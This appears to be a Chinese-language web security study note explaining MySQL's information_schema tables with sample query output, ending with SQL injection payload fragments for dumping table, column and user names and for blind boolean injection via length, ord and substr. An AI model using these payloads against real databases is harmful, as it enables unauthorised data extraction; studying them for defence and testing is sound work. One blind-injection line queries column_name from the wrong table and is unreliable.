# SQL注入
![](E:\writedown\photo\websafe_study\SQL注入-小迪安全.png)

## MYSQL注入
![](E:\writedown\photo\websafe_study\mysql注入-小迪.png)

### 一、information_schema
information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。
information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。

* SCHEMATA 表

​		获取所有数据库名

```SCHEMATA
mysql> use information_schema;
mysql> select SCHEMA_NAME from SCHEMATA;
+--------------------+
| SCHEMA_NAME        |
+--------------------+
| information_schema |
| demo1              |
| mysql              |
| performance_schema |
| sys                |
| test_db            |
+--------------------+
6 rows in set (0.00 sec)
```

* TABLES 表

​		存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。

```TABLES
mysql> select TABLE_SCHEMA,TABLE_NAME from tables;
+--------------------+------------------------------------------------------+
| TABLE_SCHEMA       | TABLE_NAME                                           |
+--------------------+------------------------------------------------------+
| information_schema | CHARACTER_SETS                                       |
| information_schema | COLLATIONS                                           |
| ******************************************                                |
| ******************************************                                |
| ******************************************                                |
| sys                | x$waits_by_user_by_latency                           |
| sys                | x$waits_global_by_latency                            |
| test_db            | tb_emp1                                              |
| test_db            | tmp7                                                 |
+--------------------+------------------------------------------------------+
```

* COLUMNS 表

​		存储表中的列信息，包括表有多少列、每个列的类型等。`SHOW COLUMNS FROM schemaname.tablename` 命令从这个表获取结果。

```COLUMNS
mysql> SELECT TABLE_CATALOG, TABLE_SCHEMA,TABLE_NAME FROM COLUMNS LIMIT 3080,3087;
+---------------+--------------+---------------------------+
| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME                |
+---------------+--------------+---------------------------+
| def           | sys          | x$waits_global_by_latency |
| def           | sys          | x$waits_global_by_latency |
| def           | test_db      | tb_emp1                   |
| def           | test_db      | tb_emp1                   |
| def           | test_db      | tb_emp1                   |
| def           | test_db      | tb_emp1                   |
| def           | test_db      | tmp7                      |
+---------------+--------------+---------------------------+
7 rows in set (0.03 sec)
```

* USER_PRIVILEGES 表
```USER_PRIVILEGES
mysql> select * from user_privileges;
+-----------------------------+---------------+-------------------------+--------------+
| GRANTEE                     | TABLE_CATALOG | PRIVILEGE_TYPE          | IS_GRANTABLE |
+-----------------------------+---------------+-------------------------+--------------+
| 'root'@'localhost'          | def           | SELECT                  | YES          |
| 'root'@'localhost'          | def           | INSERT                  | YES          |
| 'root'@'localhost'          | def           | UPDATE                  | YES          |
| *****************************                                                        |
| *****************************                                                        |
| 'root'@'localhost'          | def           | EVENT                   | YES          |
| 'root'@'localhost'          | def           | TRIGGER                 | YES          |
| 'root'@'localhost'          | def           | CREATE TABLESPACE       | YES          |
| 'mysql.session'@'localhost' | def           | SUPER                   | NO           |
| 'mysql.sys'@'localhost'     | def           | USAGE                   | NO           |
+-----------------------------+---------------+-------------------------+--------------+
30 rows in set (0.00 sec)
```

  





## 基本爆数据语法

```
group_concat(table_name)from information_schema.tables where table_schema=database()
group_concat(column_name)from information_schema.columns where table_name='users'
group_concat(username)from users

table_name='user'
table_schema='security'
```



### 盲注判断

```
or (select length(table_name) from information_schema.tables where table_schema=database()) = 5

ord(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) >97


length(substr((select column_name from information_schema.tables where table_schema=database() and table_name='users' limit 0,1),1))>1
```

